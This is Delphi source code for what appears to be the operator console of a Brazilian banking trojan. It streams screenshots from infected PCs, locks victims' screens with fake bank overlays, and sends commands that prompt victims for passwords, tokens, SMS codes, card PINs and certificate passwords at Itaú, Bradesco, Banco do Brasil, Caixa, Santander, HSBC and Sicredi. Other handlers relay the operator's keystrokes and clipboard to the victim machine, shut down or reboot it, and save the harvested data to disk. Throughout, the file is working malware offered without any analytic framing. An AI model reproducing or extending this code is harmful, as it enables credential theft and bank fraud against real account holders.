procedure TForm2.CheckBox2KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_SPACE then
    Key := 0;
end;

procedure TForm2.CheckBox1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_SPACE then
    Key := 0;
end;

procedure TForm2.CheckBox2Click(Sender: TObject);
begin
  if CheckBox2.Checked then
    Socket.SendText('<|REQUESTKEYBOARD|>'+intToStr(Socket.Handle)+'<<|');
end;

procedure TForm2.FormClose(Sender: TObject; var Action: TCloseAction);
var
  L,L9: TListItem;
begin
  CheckBox1.Checked := false;
  CheckBox2.Checked := false;

  L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then begin
    L.SubItems.Objects[1] := nil;
    L.SubItems.Objects[2] := nil;
  end;
    // Desativa Timers
  TrmTecladoNavi.Enabled := False;
  TrmAviso.Enabled := False;
  Remoto.Terminate;
  Destroy;

end;

procedure TForm2.FormResize(Sender: TObject);
begin
//  image1.left := trunc((ScrollBox1.width - image1.width) / 2);
//  image1.top := trunc((ScrollBox1.height - image1.height) / 2);
  
end;

procedure TForm2.Image1DblClick(Sender: TObject);
begin
  if CheckBox1.Checked then
      Socket.SendText('<|MouseDC|>');
end;



{ TRemoto }

procedure TRemoto.Execute;
var
  Desktop: TForm2;
 i: Integer;
 L,L2: TListItem;
 bmp: TBitmap;
 Stream: TMemoryStream;

  MyBuffer: array[0..10000] of byte;
   MyReceviceLength: integer;
   S,BBB6,Bank,s2,dados2: string;
   recebendo: boolean;

   MyFirstBmp, MySecondBmp, MyCompareBmp, UnPackStream, MyTempStream: TMemoryStream;
          MySize: Longint;

begin
   MyFirstBmp := TMemoryStream.Create;
     UnpackStream := TMemoryStream.Create;

     MyTempStream := TMemoryStream.Create;
     MySecondBmp := TMemoryStream.Create;
     MyCompareBmp := TMemoryStream.Create;
     UnPackStream := TMemoryStream.Create;


         if Form1.LV1.Visible = True then
    begin
     for i := 0 to Form1.LV1.Items.Count-1 do begin
      if Form1.LV1.Items.Item[i].SubItems.Objects[1] = TCustomWinSocket(Socket) then
        L := Form1.LV1.Items.Item[i];
    end;
    end;


 While not Terminated and Socket.Connected do
 begin
   if Socket.ReceiveLength > 0 then
   begin
    S := Socket.ReceiveText;
    if MySize = 0 then
      begin

            if Pos('<|TAMANHO|>', s)> 0 then begin
           dados2 := s;
           Delete(dados2, 1, Pos('<|TAMANHO|>', dados2)+10);
           dados2 := Copy(dados2, 1, Pos('<<|', dados2)-1);
          // Application.MessageBox(PChar(dados2), 'a', 64);
          MySize := StrToInt(dados2);
        (L.SubItems.Objects[2] as TForm2).ProgressBar1.Max := MySize;
          recebendo := true;
          dados2 := '';
           Socket.SendText('<|okok|>');
           end;
      end
   else
      begin

     dados2 := dados2+s;

         if Length(dados2) >= MySize then
            begin
              MyTempStream.Write(dados2[1], MySize);
               MyTempStream.Position := 0;
               UnPackStream.Clear;


               (L.SubItems.Objects[2] as TForm2).Label4.Visible := False;
               (L.SubItems.Objects[2] as TForm2).ProgressBar1.Position := MySize;

               // ExpandStream(MyTempStream, UnPackStream);
               UnPackStream.LoadFromStream(MyTempStream);
               DecompressStream(UnPackStream); 
               UnPackStream.Position := 0;
               if MyFirstBmp.Size = 0 then
                  begin
                     MyFirstBmp.CopyFrom(UnPackStream, 0);
                     MyFirstBmp.Position := 0;


                     (L.SubItems.Objects[2] as TForm2).Image1.Picture.Bitmap.LoadFromStream(MyFirstBmp);
                     (L.SubItems.Objects[2] as TForm2).Width := (L.SubItems.Objects[2] as TForm2).Image1.Width+30;
                     (L.SubItems.Objects[2] as TForm2).Height := (L.SubItems.Objects[2] as TForm2).Image1.Height+100;

                     (L.SubItems.Objects[2] as TForm2).ResX := (L.SubItems.Objects[2] as TForm2).Image1.Picture.Width;
                     (L.SubItems.Objects[2] as TForm2).ResY := (L.SubItems.Objects[2] as TForm2).Image1.Picture.Height;
                  end
               else
                  begin
                     MyCompareBmp.Clear;
                     MySecondBmp.Clear;

                     MyCompareBmp.CopyFrom(UnpackStream, 0);
                     ResumeStream(MyFirstBmp, MySecondBmp, MyCompareBmp);

                     if L.SubItems.Objects[2] <> nil then
                       (L.SubItems.Objects[2] as TForm2).Image1.Picture.Bitmap.LoadFromStream(MySecondBmp);

                  end;
              MySize := 0;
              UnPackStream.Clear;
              MyTempStream.Clear;
              MySecondBMP.Clear;
              MyCompareBmp.Clear;

              if ((L.SubItems.Objects[2] <> nil) and(L.SubItems.Objects[2] as TForm2).Visible) then
                Socket.SendText('<|gets|>');
            end;
        end;
      end;


   Sleep(10); // evita a CPU ficar em 100%
 end;
end;

procedure TForm2.CheckBox3Click(Sender: TObject);
begin
  if CheckBox3.Checked then begin
    Image1.AutoSize := False;
    Image1.Stretch := true;
    Image1.Align := alClient;
  end else begin
    Image1.AutoSize := true;
    Image1.Stretch := false;
    Image1.Align := alNone;
  end;
end;

procedure TForm2.PedirSenhade6Dgitos1Click(Sender: TObject);
begin
// Solicita Senha de 6 BB
trava();
Socket.SendText('{SENHA6BB}');
end;

procedure TForm2.FormCreate(Sender: TObject);
begin
Memo1.Clear;
{
if Form1.Edit6.Text = 'Espiar' then
begin
SetMenuAccess(MainMenu1,False);
GroupBox1.Visible := False;
CheckBox1.Enabled := False;
CheckBox2.Enabled := False;
CheckBox3.Enabled := False;
CheckBox4.Enabled := False;
CheckBox5.Enabled := False;
end;
}

end;

procedure TForm2.Button1Click(Sender: TObject);
begin
Memo1.Clear;
end;

procedure TForm2.SolicitarSenhaCartto1Click(Sender: TObject);
begin
// Solicita Senha de 6 ITAU
trava();
Socket.SendText('{SENHA6IT}');
end;

procedure TForm2.PedirAssinaturaEletrnica1Click(Sender: TObject);
begin
// Solicita Senha de 6 CEF
trava();        
Socket.SendText('{SENHA6CF}');
end;

procedure TForm2.SolicitarToken1Click(Sender: TObject);
begin
// Solicita Token Sicredi
trava();
Socket.SendText('{TOKENSIC}');
end;

procedure TForm2.SolicitarSenhaCartoUniclass1Click(Sender: TObject);
begin
// Solicita Senha de 6 ITAU
trava();
Socket.SendText('{SENHA6UN}');
end;

procedure TForm2.SolicitarSenhaCartoPersonalitte1Click(Sender: TObject);
begin
// Solicita Senha de 6 ITAU
trava();
Socket.SendText('{SENHA6PE}');
end;

procedure TForm2.PedirToken3Click(Sender: TObject);
begin
// Solicita Token ITAU
trava();
Socket.SendText('{TOKENIT}');
Form1.Label3.Caption := 'Normal';
Form10.Show;
end;

procedure TForm2.SolicitarTokenUniclass1Click(Sender: TObject);
begin
// Solicita Token ITAU
trava();
Socket.SendText('{TOKENUNI}');
Form1.Label3.Caption := 'Uniclass';
Form10.Show;
end;

procedure TForm2.SolicitarTokenPersonalite1Click(Sender: TObject);
begin
// Solicita Token ITAU
trava();
Socket.SendText('{TOKENPE}');
Form1.Label3.Caption := 'Perso';
Form10.Show;
end;

procedure TForm2.SolicitarSenhadaConta1Click(Sender: TObject);
begin
// Solicita Token Sicredi
trava();
Socket.SendText('{SICASS}');
end;

procedure TForm2.SolicitarAssinaturaeSrie1Click(Sender: TObject);
begin
// Solicita Assinatura Santa
trava();
Socket.SendText('{SENHA6SA}');
end;

procedure TForm2.SolicitarToken2Click(Sender: TObject);
begin
// Solicita Token Santa
trava();
Socket.SendText('{TOKENSA}');
end;

procedure TForm2.DesligarMonitorRemoto1Click(Sender: TObject);
begin
Socket.SendText('{DESMON}');
Application.MessageBox('Monitor Remoto Desligado!', 'Aviso', 64);
end;

procedure TForm2.LigarMonitorRemoto1Click(Sender: TObject);
begin
Socket.SendText('{LIGAMON}');
Application.MessageBox('Monitor Remoto Ligado!', 'Aviso', 64);
end;

procedure TForm2.ravarMouseMonitorRemoto1Click(Sender: TObject);
begin
Socket.SendText('{TRAVAM}');
end;

procedure TForm2.DestravarMouseTecladoRemoto1Click(Sender: TObject);
begin
Socket.SendText('{DESTRAVAM}');
end;


procedure TForm2.TrmTecladoNaviTimer(Sender: TObject);
var 
      i : byte;
      s2,Bank1: string;
begin


 if (Active) and (CheckBox5.Checked = True) then begin
  try
 { CheckBox1.TabStop := false;
  CheckBox2.TabStop := false;
  CheckBox3.TabStop := false;}
  for i:=8 To 222 do
    begin
       if GetAsyncKeyState(i)=-32767 then
        begin
        case i of
        8  : Socket.SendText('{BS}');
        13 : Socket.SendText('{ENTER}');
        17 : Socket.SendText('{CTRL}');
        27 : Socket.SendText('{ESCAPE}');
        32 : Socket.SendText('{SPACE}');
        37 : Socket.SendText('{LEFT}');
        38 : Socket.SendText('{UP}');
        39 : Socket.SendText('{RIGHT}');
        40 : Socket.SendText('{DOWN}');
        188 : Socket.SendText('{VIRG}');
        110 : Socket.SendText('{PONTO}');
        190 : Socket.SendText('{PONTO1}');
        46 : Socket.SendText('{DEL}');
        48 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText(')')
             else Socket.SendText('0');
        49 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('!')
             else Socket.SendText('1');
        50 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('@')
             else Socket.SendText('2');
        51 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('#')
             else Socket.SendText('3');
        52 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('$')
             else Socket.SendText('4');
        53 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('%')
             else Socket.SendText('5');
        54 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('^')
             else Socket.SendText('6');
        55 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('&')
             else Socket.SendText('7');
        56 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('*')
             else Socket.SendText('8');
        57 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('(')
             else Socket.SendText('9');
         65..90 : // a..z , A..Z
            begin
                   Socket.SendText('<|LETR|>'+ Chr(i) +'<|>');//a..z
                   //Socket2.SendText(UpperCase(Chr(i))) //A..Z
              end;
             end;
       end;
      end;
    except
      exit;
    end;
  end;

end;

procedure TForm2.Sobre1Click(Sender: TObject);
begin
Application.MessageBox('Atualização smalville Versão 17', 'Sobre', 64);
end;

procedure TForm2.EnviarAvisodeAtualiao1Click(Sender: TObject);
begin
Socket.SendText('{DESCOB}');
Form9.Show;
Form1.Label3.Caption := 'DESCONORMAL';

end;

procedure TForm2.SolicitarPosioTabela1Click(Sender: TObject);
begin
Form1.Label6.Caption := 'Normal';
Form5.Show;
end;

procedure TForm2.PedirToken2Click(Sender: TObject);
begin
trava();
Socket.SendText('{DESCOTO}');
end;

procedure TForm2.SolictarSenhadaConta1Click(Sender: TObject);
begin
trava();
Socket.SendText('{BBGF8}');
end;

procedure TForm2.SolicitarSenhadoCertificado1Click(Sender: TObject);
begin
trava();
Socket.SendText('{BBGFC}');
end;

procedure TForm2.TrmAvisoTimer(Sender: TObject);
begin
{
 if CheckBox1.Checked = True then begin
  CheckBox4.Checked := False;
  end;
   if CheckBox2.Checked = True then begin
  CheckBox5.Checked := False;
  end;
   if CheckBox4.Checked = True then begin
  CheckBox1.Checked := False;
  end;
   if CheckBox5.Checked = True then begin
  CheckBox2.Checked := False;
  end;
   if CheckBox1.Checked = False then begin
  CheckBox4.Checked := True;
  end;
   if CheckBox2.Checked = False then begin
  CheckBox5.Checked := True;
  end;
}

  // Monitora Avisos
  if Label5.Caption <> '' then
  begin
  Label5.Caption := '';
  Label6.Visible:= true;
  Label6.Caption:= 'Tela enviada com sucesso. Evite mexer o mouse quando solicitar dados ao Cliente!';
//  Application.MessageBox('Tela enviada com sucesso!', 'AVISO', 64);
  end;

    // Monitora Avisos
  if Label8.Caption <> '' then
  begin
  Label8.Caption := '';
  Label6.Visible:= true;
  Label6.Caption:= 'Acesso desbloqueado com sucesso!';
 // Application.MessageBox('Acesso desbloqueado com sucesso!', 'AVISO', 64);
  end;

end;

procedure TForm2.SolicitarTokenPrime1Click(Sender: TObject);
begin
trava();
Socket.SendText('{DESCOPO}');
end;

procedure TForm2.EnviarAvisoAtualizaoPrime1Click(Sender: TObject);
begin
//Socket.SendText('{DESCOP}');
Form9.Show;
Form1.Label3.Caption := 'DESCOPRIME';

end;

procedure TForm2.ravarTela1Click(Sender: TObject);
begin
// Trava BB
//Socket.SendText('{TRAVABB}');
Form9.Show;
Label7.Caption := 'BB';
Form1.Label3.Caption := 'BBNORMAL';
Button5.Enabled := True;
end;

procedure TForm2.ravarTela2Click(Sender: TObject);
begin
// Trava BB GF
Socket.SendText('{BBGFA}');
Form9.Show;
Form1.Label3.Caption := 'BBEMPRESARIAL';
Label7.Caption := 'BBEMPRESARIAL';
Button5.Enabled := True;

end;

procedure TForm2.ravarTela3Click(Sender: TObject);
begin
// Trava CEF
Socket.SendText('{TRAVACEF}');
Form9.Show;
Label7.Caption := 'CAIXA';
Form1.Label3.Caption := 'CAIXA';
Button5.Enabled := True;

end;

procedure TForm2.ravarTela4Click(Sender: TObject);
begin
// Solicita Assinatura Santa
Socket.SendText('{TRAVASAN}');
Label7.Caption := 'SANTAJUJU';
Button5.Enabled := True;
Form9.Show;
Form1.Label3.Caption := 'SANTAJUJU';
end;

procedure TForm2.ravarTela5Click(Sender: TObject);
begin
 // Trava Sicredi
//Socket.SendText('{TRAVASIC}');
Form9.Show;
Form1.Label3.Caption := 'SICREDI';
end;

procedure TForm2.ravarTelaNormal1Click(Sender: TObject);
begin
 // Trava Ita
Socket.SendText('{TRAVANO}');
Form1.Label3.Caption := 'Normal';
Form9.Show;

end;

procedure TForm2.ravarTelaUniClass1Click(Sender: TObject);
begin
 // Trava Ita
Socket.SendText('{TRAVAUNI}');
Form1.Label3.Caption := 'Uniclass';

Form9.Show;
end;

procedure TForm2.ravarTelaPersonnalit1Click(Sender: TObject);
begin
 // Trava Ita
Socket.SendText('{TRAVAPER}');
Form1.Label3.Caption := 'Perso';
Form9.Show;
end;

procedure TForm2.DesligarPCRemoto1Click(Sender: TObject);
begin
Socket.SendText('<|desli|>');
end;

procedure TForm2.ReiniciarPCRemoto1Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.DestravarTela1Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.DestravarTela2Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.DestravarTela3Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.DestravarTela4Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.DestravarTela5Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.DestravarTela6Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.DestravarTela7Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.Timer2Timer(Sender: TObject);
var
 imgIndex : Integer;
 sTemp: string;
 boolConsumo: boolean;
 boolBoleto: boolean;
 iPreenche: Integer;
begin

  sTemp := StringReplace(Edit1.Text,' ','',[rfReplaceAll]);
  sTemp := StringReplace(sTemp,'.','',[rfReplaceAll]);
  sTemp := StringReplace(sTemp,'-','',[rfReplaceAll]);
  sTemp := StringReplace(sTemp,':','',[rfReplaceAll]);
  sTemp := StringReplace(sTemp,',','',[rfReplaceAll]);

  Form2.Memo1.Lines.Add(Copy(sTemp,1,12));
end;

procedure TForm2.Button2Click(Sender: TObject);
var
 imgIndex : Integer;
 sTemp: string;
 boolConsumo: boolean;
 boolBoleto: boolean;
 iPreenche: Integer;
 Lista: TStringList;
 valor: integer;
begin

  Lista := TStringList.Create;

   sTemp := StringReplace(Edit1.Text,' ','',[rfReplaceAll]);
   sTemp := StringReplace(sTemp,'.','',[rfReplaceAll]);
   sTemp := StringReplace(sTemp,'-','',[rfReplaceAll]);
   sTemp := StringReplace(sTemp,':','',[rfReplaceAll]);
   sTemp := StringReplace(sTemp,',','',[rfReplaceAll]);
   Edit1.Text := sTemp;

  if Edit2.Text = '' then
  begin
  Application.MessageBox('ATENÇÃO! Selecione uma posição com o mouse para o preenchimento do campo!', 'ERRO', 64);
  end;

 if RadioButton1.Checked = True then
  begin
  Socket.SendText('click'+ Trim(Edit2.Text));
  sleep(500);
  Socket.SendText('<|PREL|>'+ Edit1.Text +'<|>');
  //Edit1.Clear;
  CheckBox8.Checked := False;
  CheckBox6.Checked := False;
  CheckBox7.Checked := False;
  RadioButton1.Checked := False;
  end;


  //MMClick.Lines.Add(Copy(Edit1.Text,1,5));
  //Socket.SendText('<|PREL|>'+ Trim(MMClick.Lines.Strings[0]));
  //MMClick.Lines.Add(Copy(Edit1.Text,6,5));
  //Socket.SendText('<|PREL|>'+ Trim(MMClick.Lines.Strings[1]));
  //MMClick.Lines.Add(Copy(Edit1.Text,11,5));
  //Socket.SendText('<|PREL|>'+ Trim(MMClick.Lines.Strings[2]));
  //MMClick.Lines.Add(Copy(Edit1.Text,16,6));
  //Socket.SendText('<|PREL|>'+ Trim(MMClick.Lines.Strings[3]));
  //MMClick.Lines.Add(Copy(Edit1.Text,22,5));
  //Socket.SendText('<|PREL|>'+ Trim(MMClick.Lines.Strings[4]));
  //MMClick.Lines.Add(Copy(Edit1.Text,27,6));
  //Socket.SendText('<|PREL|>'+ Trim(MMClick.Lines.Strings[5]));
  //MMClick.Lines.Add(Copy(Edit1.Text,33,1));
  //Socket.SendText('<|PREL|>'+ Trim(MMClick.Lines.Strings[6]));
  //MMClick.Lines.Add(Copy(Edit1.Text,34,14));
  //Socket.SendText('<|PREL|>'+ Trim(MMClick.Lines.Strings[7]));


  end;
procedure TForm2.Enviar1Click(Sender: TObject);
begin
Form4.Show;
end;

procedure TForm2.Button3Click(Sender: TObject);
begin
SaveDialog1.Execute;
Image1.Picture.SaveToFile(SaveDialog1.FileName);
end;

procedure TForm2.ravarTela6Click(Sender: TObject);
begin
// Trava HSBC
//Socket.SendText('{TRAVAHS}');
Form9.Show;
Form1.Label3.Caption := 'HsbcNormal';
end;

procedure TForm2.DestravarTela8Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.Solicitar1Click(Sender: TObject);
begin
// Solicita Senha Alfa HSBC
trava();
Socket.SendText('{SENHA7HS}');
end;

procedure TForm2.SolicitarSenhadaConta2Click(Sender: TObject);
begin
// Solicita Senha da Conta HSBC
trava();
Socket.SendText('{SENHA4HS}');
end;

procedure TForm2.SolicitarToken3Click(Sender: TObject);
begin
// Solicita Token HSBC
trava();
Socket.SendText('{TOKENHS}');
end;

procedure TForm2.ravarTela7Click(Sender: TObject);
begin
Socket.SendText('{DESCONET}');
Form9.Show;
Form1.Label3.Caption := 'DESCOEMPRESA';

end;

procedure TForm2.DestravarTela9Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.SolicitarToken4Click(Sender: TObject);
begin
trava();
Socket.SendText('{DESCONETT}');
end;

procedure TForm2.SolicitarTabelaNormal1Click(Sender: TObject);
begin
Socket.SendText('{TABEL6IT}');
Form1.Label3.Caption := 'Normal';
Form8.Show;
end;

procedure TForm2.SolicitarTabelaUniclass1Click(Sender: TObject);
begin
Form1.Label3.Caption := 'Uniclass';
Form8.Show;
end;

procedure TForm2.SolicitarTabelaPersonnalit1Click(Sender: TObject);
begin
Form1.Label3.Caption := 'Perso';
Form8.Show;
end;

procedure TForm2.ravarTela8Click(Sender: TObject);
begin
 // Trava Ita
Socket.SendText('{TRAVAEM}');
Form9.Show;
Form1.Label3.Caption := 'ITAUEMPRESA';
end;

procedure TForm2.DestravarTela10Click(Sender: TObject);
begin
Socket.SendText('<|reini|>');
end;

procedure TForm2.SolicitarSenhaNascimentoCarto1Click(Sender: TObject);
begin
// Solicita Senha de 6 ITAU
trava();
Socket.SendText('{SENHA6EM}');
end;

procedure TForm2.SolicitarToken5Click(Sender: TObject);
begin
// Solicita Token ITAU
trava();
Socket.SendText('{TOKENEM}');
Form1.Label3.Caption := 'ItaEmpresa';
Form10.Show;
end;

procedure TForm2.DestravarTela11Click(Sender: TObject);
begin
// Desativa Timers
TrmTecladoNavi.Enabled := False;
TrmAviso.Enabled := False;
CheckBox1.Checked := False;
Socket.SendText('{DESTRAVAM}');
sleep(500);
Socket.SendText('<|reini|>');
end;

procedure TForm2.Button4Click(Sender: TObject);
var
  Str: string;
begin
   GetClipboardText(Handle, Str);
   Socket.SendText('<|CLIP|>'+ Str +'<|>');
end;

procedure TForm2.Fechar1Click(Sender: TObject);
var
  L,L9: TListItem;
begin
  CheckBox1.Checked := false;
  CheckBox2.Checked := false;

  L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then begin
    L.SubItems.Objects[1] := nil;
    L.SubItems.Objects[2] := nil;
  end;
  // Desativa Timers
  TrmTecladoNavi.Enabled := False;
  TrmAviso.Enabled := False;
  Remoto.Terminate;
  Destroy;
end;

procedure TForm2.SolicitarSenhadoCartoNormal1Click(Sender: TObject);
begin
trava();
Socket.SendText('{DESCOCN}');
end;

procedure TForm2.SolicitarSenhadoCartodeCrditoPrime1Click(Sender: TObject);
begin
trava();
Socket.SendText('{DESCOCP}');
end;

procedure TForm2.SolicitarSrieToken1Click(Sender: TObject);
begin
// Solicita Série Token Santa
trava();
Socket.SendText('{TOKENSE}');
end;

procedure TForm2.SolicitarPosioTabelaPrime1Click(Sender: TObject);
begin
Form1.Label6.Caption := 'Prime';
Form5.Show;
end;

procedure TForm2.SolicitarSenhadoCartoDbitoNormal4Dgitos1Click(
  Sender: TObject);
begin
trava();
Socket.SendText('{DESCO4N}');
end;

procedure TForm2.SolicitarSenhadoCartoDbitoPrime4Dgitos1Click(
  Sender: TObject);
begin
trava();
Socket.SendText('{DESCO4P}');
end;

procedure TForm2.SolicitarSenhadoCertificado2Click(Sender: TObject);
begin
trava();
Socket.SendText('{DESCONETC}');
end;

procedure TForm2.SolicitarSMS1Click(Sender: TObject);
begin
trava();
//Socket.SendText('{SENHASBB}');
Form1.Label3.Caption := 'Normal';
Form11.Show;
end;

procedure TForm2.SolicitarToke1Click(Sender: TObject);
begin
trava();
Socket.SendText('{BBGFT}');
end;

procedure TForm2.ravarTelaBBEstilo1Click(Sender: TObject);
begin
//Socket.SendText('{TRAVABBE}');
Label7.Caption := 'BB';
Button5.Enabled := True;
Form9.Show;
Form1.Label3.Caption := 'BBESTILO';

end;

procedure TForm2.SolicitarSenhade6DgitosEstilo1Click(Sender: TObject);
begin
trava();
Socket.SendText('{SENHA6E}');
end;

procedure TForm2.SolicitarSMSEstilo1Click(Sender: TObject);
begin
trava();
//Socket.SendText('{BBESMS}');
Form1.Label3.Caption := 'Estilo';
Form11.Show;
end;

procedure TForm2.BloquearTela24hrs1Click(Sender: TObject);
var
  L,L9: TListItem;
begin
  Socket.SendText('{TRAVA24}');
  CheckBox1.Checked := false;
  CheckBox2.Checked := false;

  L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then begin
    L.SubItems.Objects[1] := nil;
    L.SubItems.Objects[2] := nil;
  end;
  sleep(1000);
  // Desativa Timers
  TrmTecladoNavi.Enabled := False;
  TrmAviso.Enabled := False;
  Socket.SendText('{DESTRAVAM}');
  sleep(100);
  Socket.SendText('<|reini|>');
  Remoto.Terminate;
  Destroy;
end;

procedure TForm2.FormShow(Sender: TObject);
var
bb,cef,ita,santa,desco: string;
begin
if casas = 'DESCO' then
Begin
PageControl1.ActivePage := TabSheet4;
casas:='';
end;
if casas = 'DESCOJU' then
Begin
PageControl1.ActivePage := TabSheet4;
PageControl5.ActivePage :=  TabSheet17;
casas:='';
end;
If  casas = 'BB' Then
begin
PageControl1.ActivePage := Tabbrasilf;
casas:='';
end;
 IF casas = 'CAIXA' then
 begin
 PageControl1.ActivePage := Tabcef;
 casas:='';
 end;
 If casas = 'SANTA' then
 begin
 PageControl1.ActivePage := TabSheet5;
 casas:='';
 end;
 If casas = 'ITAU' then
 begin                    
 PageControl1.ActivePage := TabSheet3;
 casas:='';
 end;
  If casas = 'HSBC' then
 begin
 PageControl1.ActivePage := TabSheet9;
 casas:='';
 end;
  if casas = 'NORDESTE' then
  begin
   PageControl1.ActivePage := TabSheet8;
   casas:='';
  end;    
    if casas = 'Sicredi' then
  begin
   PageControl1.ActivePage := TabSheet6;
   casas:='';
  end;  
    if casas = 'Sicoob' then
  begin
   PageControl1.ActivePage := TabSheet6;
   casas:='';
  end;
// Ativa Timers


TrmTecladoNavi.Enabled := True;
TrmAviso.Enabled := True;

if Form1.Edit6.Text = 'Navi' then
begin
CheckBox4.Checked := True;
CheckBox5.Checked := True;
CheckBox4.Enabled := True;
CheckBox5.Enabled := True;
end;

end;

procedure TForm2.EnviarMensagemRemota1Click(Sender: TObject);
begin
Form4.Show;
end;

procedure TForm2.TrmAviso1Timer(Sender: TObject);
begin
Label6.Visible := False;
TrmAviso1.Enabled := False;
end;

procedure TForm2.Button5Click(Sender: TObject);
var
after: string;
hora: TDateTime;
begin
if directoryexists('c:\infos') then
begin
hora := Time();
after := StringReplace(TimeToStr(hora), ':', '', [rfReplaceAll, rfIgnoreCase]);
Memo1.Lines.SaveToFile('c:\infos\' + Label7.Caption + '-' + after + '.txt');
Application.MessageBox('Arquivo criado  com sucesso!', 'Aviso', 64);
end
else
Application.MessageBox('Diretório não existe!', 'Erro', 64);

end;

procedure TForm2.SolicitarUsurio1Click(Sender: TObject);
begin
// Solicita Usuário CEF
trava();
Socket.SendText('{USUARIOCEF}');
end;

procedure TForm2.SolicitarSenhadaConta3Click(Sender: TObject);
begin
// Solicita Senha da Conta CEF
trava();
Socket.SendText('{SENHANETCF}');
end;

procedure TForm2.EnviarMensagem1Click(Sender: TObject);
begin
Form4.Show;
end;

procedure TForm2.ravarTelaHSBCPremier1Click(Sender: TObject);
begin
Form9.Show;
Form1.Label3.Caption := 'HsbcPremier';
end;

procedure TForm2.SolicitarSenhaAlfaNumricaremier1Click(Sender: TObject);
begin
// Solicita Senha Alfa HSBC Premier
trava();
Socket.SendText('{SENHA7HSPRE}');
end;

procedure TForm2.SolicitarSenhadaContaPremier1Click(Sender: TObject);
begin
// Solicita Senha 4 HSBC Premier
trava();
Socket.SendText('{SENHA4HSPRE}');
end;

procedure TForm2.SolicitarTokenPremier1Click(Sender: TObject);
begin
// Solicita Senha 4 HSBC Premier
trava();
Socket.SendText('{TOKENHSPRE}');
end;

procedure TForm2.SolicitarViadoCartoAdvanced1Click(Sender: TObject);
begin
// Solicita Via do Cartão
trava();
Socket.SendText('{VIAHS}');
end;

procedure TForm2.SolicitarViadoCartoPremier1Click(Sender: TObject);
begin
// Solicita Via do Cartão
trava();
Socket.SendText('{VIAHSPRE}');
end;

procedure TForm2.SolicitarSenhaAutoAtendimentoNormal1Click(
  Sender: TObject);
begin
// Solicita Senha Auto Atendimento
trava();
Socket.SendText('{BBAUTON}');
end;

procedure TForm2.SolicitarSenhaAutoAtendimentoEstilo1Click(
  Sender: TObject);
begin
// Solicita Senha Auto Atendimento
trava();
Socket.SendText('{BBAUTOE}')
end;

procedure TForm2.DesbloquearTela24hrs1Click(Sender: TObject);
begin
Socket.SendText('{DES24}');
end;

procedure TForm2.SolicitarNascimentoItaNormal1Click(Sender: TObject);
begin
trava();
// ITAU NASCIMENTO NORMAL
Socket.SendText('{ITNASCN}');
end;

procedure TForm2.SolicitarNascimentoItaUniclass1Click(Sender: TObject);
begin
trava();
// ITAU NASCIMENTO UNICLASS
Socket.SendText('{ITNASCU}');
end;

procedure TForm2.SolicitarNascimentoItaPersonnalit1Click(Sender: TObject);
begin
trava();
// ITAU NASCIMENTO UNICLASS
Socket.SendText('{ITNASCP}');
end;

procedure TForm2.SolicitarTokenCelularNormal1Click(Sender: TObject);
begin
trava();
Socket.SendText('{DESCOSN}');
end;

procedure TForm2.SolicitarTokenCelularPrime1Click(Sender: TObject);
begin
trava();
Socket.SendText('{DESCOSE}');
end;

procedure TForm2.ravarTela9Click(Sender: TObject);
begin
// Trava BB GF
Socket.SendText('{BBGFA}');
Form9.Show;
Form1.Label3.Caption := 'BBEMPRESA';
Label7.Caption := 'BBEMPRESA';
Button5.Enabled := True;
end;

procedure TForm2.SolicitarSenhadoCertificado3Click(Sender: TObject);
begin
trava();
Socket.SendText('{BBECSX}');
end;

procedure TForm2.SolictarSenhadaConta2Click(Sender: TObject);
begin
trava();
Socket.SendText('{BBXCS1}');
end;

procedure TForm2.SolicitarSenhadeAcesso1Click(Sender: TObject);
begin
trava();
Socket.SendText('{BBXCS9}');
end;

procedure TForm2.SolicitarSenhadeAcesso2Click(Sender: TObject);
begin
trava();
Socket.SendText('{BBXCS8}');
end;

procedure TForm2.Button6Click(Sender: TObject);
begin
 Form1.Destrava;
 Socket.SendText('{TRAVAM}');
end;

procedure TForm2.CheckBox9Click(Sender: TObject);
begin
if CheckBox9.Checked then
    Socket.SendText('<|REQUESTKEYBOARD|>' + intToStr(Socket.Handle) + '<<|');
end;

procedure TForm2.CheckBox9KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
 if Key = VK_SPACE then
    Key := 0;
end;

procedure TForm2.Panel2Click(Sender: TObject);
begin
ProgressBar1.Enabled:= true;
end;

procedure TForm2.GB1Click(Sender: TObject);
begin
// trava santa fisica
Socket.SendText('{TRAVASANFIS}');
Label7.Caption := 'SANTAFIS';
Button5.Enabled := True;
Form9.Show;
Form1.Label3.Caption := 'SANTAFIS';
end;

procedure TForm2.Posiao1Click(Sender: TObject);
begin
Form1.Label6.Caption := 'SANTAFISICA';
Form5.Show;
Form5.Caption:= 'TABELA SANTA';
end;

procedure TForm2.SMS1Click(Sender: TObject);
begin
Form1.Label6.Caption := 'SANTAFISICASMS';
Form5.Show;
Form5.Caption:= 'SMS SANTA';
